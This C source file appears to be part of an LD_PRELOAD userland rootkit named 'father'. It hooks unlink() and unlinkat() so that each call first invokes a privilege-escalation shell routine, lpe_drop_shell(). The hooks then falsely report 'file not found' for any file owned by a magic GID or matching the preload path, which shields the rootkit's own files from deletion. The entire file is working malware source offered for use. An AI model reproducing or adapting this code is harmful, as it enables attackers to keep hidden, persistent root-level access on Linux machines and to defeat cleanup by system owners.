#include "father.h"

/*
 * unlink() hook, hide based on the magic STRING and GID.
*/
int unlink(const char *pathname) {

	#ifdef DEBUG
	fprintf(stderr, "unlink() called!\n");
	#endif

	lpe_drop_shell();

	if(!o_unlink) o_unlink = dlsym(RTLD_NEXT, "unlink");

	if(getegid() == GID) return o_unlink(pathname);

	// unlink() and unlinkat()

	struct stat s_buf;

	memset(&s_buf, 0, sizeof(struct stat));

	__lxstat(_STAT_VER, pathname, &s_buf);

	if(s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}

	return o_unlink(pathname);
}

/*
 * unlinkat() hook, hide based on the magic STRING and GID.
*/
int unlinkat(int dirfd, const char * pathname, int flags) {

	#ifdef DEBUG
	fprintf(stderr, "unlinkat() called!\n");
	#endif

	lpe_drop_shell();

	if(!o_unlinkat) o_unlinkat = dlsym(RTLD_NEXT, "unlinkat");

	if(getegid() == GID) return o_unlinkat(dirfd, pathname, flags);

	struct stat s_buf;

	memset(&s_buf, 0, sizeof(struct stat));

	__lxstat(_STAT_VER, pathname, &s_buf);

	if(s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}

	return o_unlinkat(dirfd, pathname, flags);
}
